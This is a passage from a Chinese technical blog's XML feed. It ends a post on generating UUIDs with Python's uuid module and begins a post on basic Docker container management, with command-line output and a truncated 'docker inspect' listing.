number">8de8</span><span class="token operator">-</span>a9d81c9ca89b<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  MD5   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid3<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_OID<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  MD5   <span class="token punctuation">:</span> <span class="token number">2beb716c</span><span class="token operator">-</span><span class="token number">3841</span><span class="token operator">-</span><span class="token number">329e</span><span class="token operator">-</span>b29d<span class="token number">-30ae925488bb</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  MD5   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid3<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_X500<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  MD5   <span class="token punctuation">:</span> <span class="token number">8182d37a</span><span class="token operator">-</span>e93b<span class="token number">-36c8</span><span class="token operator">-</span>a378<span class="token operator">-</span>aa233ef06459<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、UUID-4-基于随机值"><a href="#4、UUID-4-基于随机值" class="headerlink" title="4、UUID 4 - 基于随机值"></a>4、UUID 4 - 基于随机值</h3><p>​        当基于名称和命名的 UUID 值不够，并且为了更好的避免哈希碰撞时，引入伪随机数，但是由于有一定的重复概率，这个概率又可以被计算出来，所以该种方法也不够安全。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> uuid<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">4a2e2a2a</span><span class="token operator">-</span><span class="token number">318b</span><span class="token operator">-</span><span class="token number">4bb4</span><span class="token operator">-</span>be79<span class="token operator">-</span>c749c3239704 <span class="token number">0</span><span class="token number">342f19a9</span><span class="token operator">-</span><span class="token number">79e7</span><span class="token operator">-</span><span class="token number">4974</span><span class="token operator">-</span><span class="token number">90f4</span><span class="token operator">-</span>e168b54fea20 <span class="token number">1</span>eddd6eba<span class="token number">-64b6</span><span class="token operator">-</span><span class="token number">4cd1</span><span class="token operator">-</span>ae12<span class="token number">-30d682252614</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        随机源取决于 uuid 被导入时可用的 C 库。如果  libuuid 或者 （uuid.dll）能够被加载，将使用库中包含生成随机值的函数。否则使用  os.urandom()  或者使用 random  模块。</p><h3 id="5、UUID-5-基于名字和SHA1散列值"><a href="#5、UUID-5-基于名字和SHA1散列值" class="headerlink" title="5、UUID 5 - 基于名字和SHA1散列值"></a>5、UUID 5 - 基于名字和SHA1散列值</h3><p>​        算法和uuid3()相同，不同的是使用Secure Hash Algorithm 1 算法。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> uuid<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  SHA1   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid5<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_DNS<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  SHA1   <span class="token punctuation">:</span> <span class="token number">770551b4</span><span class="token operator">-</span><span class="token number">31a3</span><span class="token operator">-</span><span class="token number">5867</span><span class="token operator">-</span><span class="token number">85a7</span><span class="token operator">-</span>a95a5343a58c<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  SHA1   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid5<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_URL<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  SHA1   <span class="token punctuation">:</span> <span class="token number">4cd268ba</span><span class="token operator">-</span>fac0<span class="token number">-5cdf</span><span class="token operator">-</span>a63f<span class="token number">-3732efe8eb77</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  SHA1   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid5<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_OID<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  SHA1   <span class="token punctuation">:</span> d753ca93<span class="token operator">-</span>d925<span class="token number">-5465</span><span class="token operator">-</span><span class="token number">9b2b</span><span class="token operator">-</span><span class="token number">1679f60d46df</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  SHA1   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid5<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_X500<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  SHA1   <span class="token punctuation">:</span> b22bedee<span class="token number">-2d2e</span><span class="token operator">-</span><span class="token number">5142</span><span class="token operator">-</span><span class="token number">9b65</span><span class="token operator">-</span><span class="token number">4d91a487bad1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、使用推荐"><a href="#三、使用推荐" class="headerlink" title="三、使用推荐"></a>三、使用推荐</h2><ul><li>如果在global的分布式计算环境下，最好用uuid1</li><li>由于uuid4存在概率性重复，可以分场合使用</li><li>如果有名字的唯一性要求，最好使用uuid3或uuid5</li></ul><p>虽然Python可以很方便的生成UUID，但是在这里还是要推荐一个网址，可以在线生成UUID:</p><pre class="line-numbers language-bash"><code class="language-bash">http://www.uuid.online<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> UUID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3实现Docker基本管理</title>
      <link href="/2020/04/08/python3-shi-xian-docker-ji-ben-guan-li/"/>
      <url>/2020/04/08/python3-shi-xian-docker-ji-ben-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3实现Docker基本管理"><a href="#Python3实现Docker基本管理" class="headerlink" title="Python3实现Docker基本管理"></a>Python3实现Docker基本管理</h1><h2 id="一、预备知识"><a href="#一、预备知识" class="headerlink" title="一、预备知识"></a>一、预备知识</h2><ul><li>Docker</li><li>Linux</li><li>Python</li></ul><h3 id="1、Docker基本命令"><a href="#1、Docker基本命令" class="headerlink" title="1、Docker基本命令"></a>1、Docker基本命令</h3><h4 id="1-1、查看已有的镜像"><a href="#1-1、查看已有的镜像" class="headerlink" title="1.1、查看已有的镜像"></a>1.1、查看已有的镜像</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker imagesREPOSITORY             TAG                 IMAGE ID            CREATED             SIZEmysql                  5.7                 84164b03fa2e        5 weeks ago         456MBwordpress              latest              126aa00ecc0c        5 weeks ago         540MBkennethreitz/httpbin   latest              b138b9264903        17 months ago       534MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2、查看已创建的容器"><a href="#1-2、查看已创建的容器" class="headerlink" title="1.2、查看已创建的容器"></a>1.2、查看已创建的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker <span class="token function">ps</span> -aCONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS                       PORTS                               NAMES8163d8d1e277        wordpress:latest       <span class="token string">"docker-entrypoint.s…"</span>   3 weeks ago         Exited <span class="token punctuation">(</span>255<span class="token punctuation">)</span> 5 minutes ago   0.0.0.0:8001-<span class="token operator">></span>80/tcp                wordpress2f23a0ef7add        mysql:5.7              <span class="token string">"docker-entrypoint.s…"</span>   3 weeks ago         Exited <span class="token punctuation">(</span>255<span class="token punctuation">)</span> 5 minutes ago   0.0.0.0:3306-<span class="token operator">></span>3306/tcp, 33060/tcp   db.wordpress1c70a141029c        kennethreitz/httpbin   <span class="token string">"gunicorn -b 0.0.0.0…"</span>   4 weeks ago         Exited <span class="token punctuation">(</span>255<span class="token punctuation">)</span> 5 minutes ago   0.0.0.0:80-<span class="token operator">></span>80/tcp                  httpbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3、查看正在运行的容器的CONTAINER-ID"><a href="#1-3、查看正在运行的容器的CONTAINER-ID" class="headerlink" title="1.3、查看正在运行的容器的CONTAINER ID"></a>1.3、查看正在运行的容器的CONTAINER ID</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker <span class="token function">ps</span> -q1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="1-4、启动一个容器"><a href="#1-4、启动一个容器" class="headerlink" title="1.4、启动一个容器"></a>1.4、启动一个容器</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker start container_id</span>➜  ~ docker start 1c70a141029c1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-5、关闭一个容器"><a href="#1-5、关闭一个容器" class="headerlink" title="1.5、关闭一个容器"></a>1.5、关闭一个容器</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker stop container_id</span>➜  ~ docker stop 1c70a141029c1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-6、重启一个容器"><a href="#1-6、重启一个容器" class="headerlink" title="1.6、重启一个容器"></a>1.6、重启一个容器</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker restart container_id</span>➜  ~ docker restart 1c70a141029c1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-7、查看一个容器的详细信息"><a href="#1-7、查看一个容器的详细信息" class="headerlink" title="1.7、查看一个容器的详细信息"></a>1.7、查看一个容器的详细信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker inspect container_id</span>➜  ~ docker inspect 1c70a141029c<span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token string">"Id"</span><span class="token keyword">:</span> <span class="token string">"1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a"</span>,        <span class="token string">"Created"</span><span class="token keyword">:</span> <span class="token string">"2020-03-09T15:37:42.352346164Z"</span>,        <span class="token string">"Path"</span><span class="token keyword">:</span> <span class="token string">"gunicorn"</span>,        <span class="token string">"Args"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>            <span class="token string">"-b"</span>,            <span class="token string">"0.0.0.0:80"</span>,            <span class="token string">"httpbin:app"</span>,            <span class="token string">"-k"</span>,            <span class="token string">"gevent"</span>        <span class="token punctuation">]</span>,        <span class="token string">"State"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Status"</span><span class="token keyword">:</span> <span class="token string">"running"</span>,            <span class="token string">"Running"</span><span class="token keyword">:</span> true,            <span class="token string">"Paused"</span><span class="token keyword">:</span> false,            <span class="token string">"Restarting"</span><span class="token keyword">:</span> false,            <span class="token string">"OOMKilled"</span><span class="token keyword">:</span> false,            <span class="token string">"Dead"</span><span class="token keyword">:</span> false,            <span class="token string">"Pid"</span><span class="token keyword">:</span> 3829,            <span class="token string">"ExitCode"</span><span class="token keyword">:</span> 0,            <span class="token string">"Error"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"StartedAt"</span><span class="token keyword">:</span> <span class="token string">"2020-04-08T23:29:38.049792725Z"</span>,            <span class="token string">"FinishedAt"</span><span class="token keyword">:</span> <span class="token string">"2020-04-08T23:29:37.29916778Z"</span>        <span class="token punctuation">}</span>,        <span class="token string">"Image"</span><span class="token keyword">:</span> <span class="token string">"sha256:b138b9264903f46a43e1c750e07dc06f5d2a1bd5d51f37fb185bc608f61090dd"</span>,        <span class="token string">"ResolvConfPath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/resolv.conf"</span>,        <span class="token string">"HostnamePath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/hostname"</span>,        <span class="token string">"HostsPath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/hosts"</span>,        <span class="token string">"LogPath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a-json.log"</span>,        <span class="token string">"Name"</span><span class="token keyword">:</span> <span class="token string">"/httpbin"</span>,        <span class="token string">"RestartCount"</span><span class="token keyword">:</span> 0,        <span class="token string">"Driver"</span><span class="token keyword">:</span> <span class="token string">"overlay2"</span>,        <span class="token string">"Platform"</span><span class="token keyword">:</span> <span class="token string">"linux"</span>,        <span class="token string">"MountLabel"</span><span class="token keyword">:</span> <span class="token string">""</span>,        <span class="token string">"ProcessLabel"</span><span class="token keyword">:</span> <span class="token string">""</span>,        <span class="token string">"AppArmorProfile"</span><span class="token keyword">:</span> <span class="token string">"docker-default"</span>,        <span class="token string">"ExecIDs"</span><span class="token keyword">:</span> null,        <span class="token string">"HostConfig"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Binds"</span><span class="token keyword">:</span> null,            <span class="token string">"ContainerIDFile"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"LogConfig"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"Type"</span><span class="token keyword">:</span> <span class="token string">"json-file"</span>,                <span class="token string">"Config"</span><span class="token keyword">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span>,            <span class="token string">"NetworkMode"</span><span class="token keyword">:</span> <span class="token string">"default"</span>,            <span class="token string">"PortBindings"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"80/tcp"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">{</span>                        <span class="token string">"HostIp"</span><span class="token keyword">:</span> <span class="token string">""</span>,                        <span class="token string">"HostPort"</span><span class="token keyword">:</span> <span class="token string">"80"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span>            <span class="token punctuation">}</span>,            <span class="token string">"RestartPolicy"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"Name"</span><span class="token keyword">:</span> <span class="token string">"no"</span>,                <span class="token string">"MaximumRetryCount"</span><span class="token keyword">:</span> 0            <span class="token punctuation">}</span>,            <span class="token string">"AutoRemove"</span><span class="token keyword">:</span> false,            <span class="token string">"VolumeDriver"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"VolumesFrom"</span><span class="token keyword">:</span> null,            <span class="token string">"CapAdd"</span><span class="token keyword">:</span> null,            <span class="token string">"CapDrop"</span><span class="token keyword">:</span> null,            <span class="token string">"Dns"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"DnsOptions"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"DnsSearch"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"ExtraHosts"</span><span class="token keyword">:</span> null,            <span class="token string">"GroupAdd"</span><span class="token keyword">:</span> null,            <span class="token string">"IpcMode"</span><span class="token keyword">:</span> <span class="token string">"shareable"</span>,            <span class="token string">"Cgroup"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Links"</span><span class="token keyword">:</span> null,            <span class="token string">"OomScoreAdj"</span><span class="token keyword">:</span> 0,            <span class="token string">"PidMode"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Privileged"</span><span class="token keyword">:</span> false,            <span class="token string">"PublishAllPorts"</span><span class="token keyword">:</span> false,            <span class="token string">"ReadonlyRootfs"</span><span class="token keyword">:</span> false,            <span class="token string">"SecurityOpt"</span><span class="token keyword">:</span> null,            <span class="token string">"UTSMode"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"UsernsMode"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"ShmSize"</span><span class="token keyword">:</span> 67108864,            <span class="token string">"Runtime"</span><span class="token keyword">:</span> <span class="token string">"runc"</span>,            <span class="token string">"ConsoleSize"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                0,                0            <span class="token punctuation">]</span>,            <span class="token string">"Isolation"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"CpuShares"</span><span class="token keyword">:</span> 0,            <span class="token string">"Memory"</span><span class="token keyword">:</span> 0,            <span class="token string">"NanoCpus"</span><span class="token keyword">:</span> 0,            <span class="token string">"CgroupParent"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"BlkioWeight"</span><span class="token keyword">:</span> 0,            <span class="token string">"BlkioWeightDevice"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"BlkioDeviceReadBps"</span><span class="token keyword">:</span> null,            <span class="token string">"BlkioDeviceWriteBps"</span><span class="token keyword">:</span> null,            <span class="token string">"BlkioDeviceReadIOps"</span><span class="token keyword">:</span> null,            <span class="token string">"BlkioDeviceWriteIOps"</span><span class="token keyword">:</span> null,            <span class="token string">"CpuPeriod"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuQuota"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuRealtimePeriod"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuRealtimeRuntime"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpusetCpus"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"CpusetMems"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Devices"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"DeviceCgroupRules"</span><span class="token keyword">:</span> null,            <span class="token string">"DiskQuota"</span><span class="token keyword">:</span> 0,            <span class="token string">"KernelMemory"</span><span class="token keyword">:</span> 0,            <span class="token string">"MemoryReservation"</span><span class="token keyword">:</span> 0,            <span class="token string">"MemorySwap"</span><span class="token keyword">:</span> 0,            <span class="token string">"MemorySwappiness"</span><span class="token keyword">:</span> null,            <span class="token string">"OomKillDisable"</span><span class="token keyword">:</span> false,            <span class="token string">"PidsLimit"</span><span class="token keyword">:</span> 0,            <span class="token string">"Ulimits"</span><span class="token keyword">:</span> null,            <span class="token string">"CpuCount"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuPercent"</span><span class="token keyword">:</span> 0,            <span class="token string">"IOMaximumIOps"</span><span class="token keyword">:</span> 0,            <span class="token string">"IOMaximumBandwidth"</span><span class="token keyword">:</span> 0,            <span class="token string">"MaskedPaths"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"/proc/acpi"</span>,                <span class="token string">"/proc/kcore"</span>,                <span class="token string">"/proc/keys"</span>,                <span class="token string">"/proc/latency_stats"</span>,                <span class="token string">"/proc/timer_list"</span>,                <span class="token string">"/proc/timer_stats"</span>,                <span class="token string">"/proc/sched_debug"</span>,                <span class="token string">"/proc/scsi"</span>,                <span class="token string">"/sys/firmware"</span>            <span class="token punctuation">]</span>,            <span class="token string">"ReadonlyPaths"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"/proc/asound"</span>,                <span class="token string">"/proc/bus"</span>,                <span class="token string">"/proc/fs"</span>,                <span class="token string">"/proc/irq"</span>,                <span class="token string">"/proc/sys"</span>,                <span class="token string">"/proc/sysrq-trigger"</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span>,        <span class="token string">"GraphDriver"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Data"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"LowerDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29-init/diff:/var/lib/docker/overlay2/7024e644c3cff797ddf664853271c501ca3153c700aa97183d8f11eb80ecb868/diff:/var/lib/docker/overlay2/05179366f7391597f28b1374de7f309939f924de7fdf759ce44af5f6345c5ca2/diff:/var/lib/docker/overlay2/e312ea37ad0b82784b3dc2432afe8006c138153264ffbb0b9494751edff96894/diff:/var/lib/docker/overlay2/5d6b92d36705697b6b65a5f82201f30c4f1ea8d73420f06869b0ba4120ed023d/diff:/var/lib/docker/overlay2/811021bd290cb003ed2e6b74b133354bbbea68acd198af64e10b09db5e63853d/diff:/var/lib/docker/overlay2/a63a3f457b76c1cb0c052a5dda2a8db2364975e8f89f1bae56d69fda57bdb8b4/diff:/var/lib/docker/overlay2/95b71e3f4a74b2924f402843f6ee47b86605ea86981eceff8ed3e2e987dd9824/diff"</span>,                <span class="token string">"MergedDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29/merged"</span>,                <span class="token string">"UpperDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29/diff"</span>,                <span class="token string">"WorkDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29/work"</span>            <span class="token punctuation">}</span>,            <span class="token string">"Name"</span><span class="token keyword">:</span> <span class="token string">"overlay2"</span>        <span class="token punctuation">}</span>,        <span class="token string">"Mounts"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,        <span class="token string">"Config"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Hostname"</span><span class="token keyword">:</span> <span class="token string">"1c70a141029c"</span>,            <span class="token string">"Domainname"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"User"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"AttachStdin"</span><span class="token keyword">:</span> false,            <span class="token string">"AttachStdout"</span><span class="token keyword">:</span> false,            <span class="token string">"AttachStderr"</span><span class="token keyword">:</span> false,            <span class="token string">"ExposedPorts"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"80/tcp"</span><span class="token keyword">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span>,            <span class="token string">"Tty"</span><span class="token keyword">:</span> false,            <span class="token string">"OpenStdin"</span><span class="token keyword">:</span> false,            <span class="token string">"StdinOnce"</span><span class="token keyword">:</span> false,            <span class="token string">"Env"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>            <span class="token punctuation">]</span>,            <span class="token string">"Cmd"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"gunicorn"</span>,                <span class="token string">"-b"</span>,                <span class="token string">"0.0.0.0:80"</span>,                <span class="token string">"httpbin:app"</span>,                <span class="token string">"-k"</span>,                <span class="token string">"gevent"</span>            <span class="token punctuation">]</span>,            <span class="token string">"ArgsEscaped"</span><span class="token keyword">:</span> true,            <span class="token string">"Image"</span><span class="token keyword">:</span> <span class="token string">"kennethreitz/httpbin"</span>,            <span class="token string">"Volumes"</span><span class="token keyword">:</span> null,            <span class="token string">"WorkingDir"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Entrypoint"</span><span class="token keyword">:</span> null,            <span class="token string">"OnBuild"</span><span class="token keyword">:</span> null,            <span class="token string">"Labels"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"description"</span><span class="token keyword">:</span> <span class="token string">"A simple HTTP service."</span>,                <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"httpbin"</span>,                <span class="token string">"org.kennethreitz.vendor"</span><span class="token keyword">:</span> <span class="token string">"Kenneth Reitz"</span>,                <span class="token string">"version"</span><span class="token keyword">:</span> <span class="token string">"0.9.2"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>,        <span class="token string">"NetworkSettings"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Bridge"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"SandboxID"</span><span class="token keyword">:</span> <span class="token string">"d52a556de3d8482e4ad7f6885edff5526a4edd685b6139a65f4a077e0523cace"</span>,            <span class="token string">"HairpinMode"</span><span class="token keyword">:</span> false,            <span class="token string">"LinkLocalIPv6Address"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"LinkLocalIPv6PrefixLen"</span><span class="token keyword">:</span> 0,            <span class="token string">"Ports"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"80/tcp"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">{</span>                        <span class="token string">"HostIp"</span><span class="token keyword">:</span> <span class="token string">"0.0.0.0"</span>,                        <span class="token string">"HostPort"</span><span class="token keyword">:</span> <span class="token string">"80"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span>            <span class="token punctuation">}</span>,            <span class="token string">"SandboxKey"</span><span class="token keyword">:</span> <span class="token string">"/var/run/docker/netns/d52a556de3d8"</span>,            <span class="token string">"SecondaryIPAddresses"</span><span class="token keyword">:</span> null,            <span class="token string">"SecondaryIPv6Addresses"</span><span class="token keyword">:</span> null,            <span class="token string">"EndpointID"</span><span class="token keyword">:</span> <span class="token string">"36bbb91a9b616841e6120477b6b5c6068cccc7a9f0e3390dc7529e98851f6bec"</span>,            <span class="token string">"Gateway"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.1"</span>,            <span class="token string">"GlobalIPv6Address"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"GlobalIPv6PrefixLen"</span><span class="token keyword">:</span> 0,            <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.2"</span>,            <span class="token string">"IPPrefixLen"</span><span class="token keyword">:</span> 16,            <span class="token string">"IPv6Gateway"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"MacAddress"</span><span class="token keyword">:</span> <span class="token string">"02:42:ac:11:00:02"</span>,            <span class="token string">"Networks"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"bridge"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                    <span class="token string">"IPAMConfig"</span><span class="token keyword">:</span> null,                    <span class="token string">"Links"</span><span class="token keyword">:</span> null,                    <span class="token string">"Aliases"</span><span class="token keyword">:</span> null,                    <span class="token string">"NetworkID"</span><span class="token keyword">:</span> <span class="token string">"dd6a0257d3dcbeb0e97e4d8095274769be43580bfa72fcd6082a9f53f3c91b1d"</span>,                    <span class="token string">"EndpointID"</span><span class="token keyword">:</span> <span class="token string">"36bbb91a9b616841e6120477b6b5c6068cccc7a9f0e3390dc7529e98851f6bec"</span>,                    <span class="token string">"Gateway"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.1"</span>,                    <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.2"</span>,                    <span class="token string">"IPPrefixLen"</span><span class="token keyword">:</span> 16,                    <span class="token string">"IPv6Gateway"</span><span class="token keyword">:</span> <span class="token string">""</span>,                    <span class="token string">"GlobalIPv6Address"</span><span class="token keyword">:</span> <span class="token string">""</span>,                    <span class="token string">"GlobalIPv6PrefixLen"</span><span class="token keyword">:</span> 0,                    <span class="token string">"MacAddress"</span><span class="token keyword">:</span> <span class="token string">"02:42:ac:11:00:02"</span>,                    <span class="token string">"DriverOpts"</span><span class="token keyword">:</span> null                <span class="token 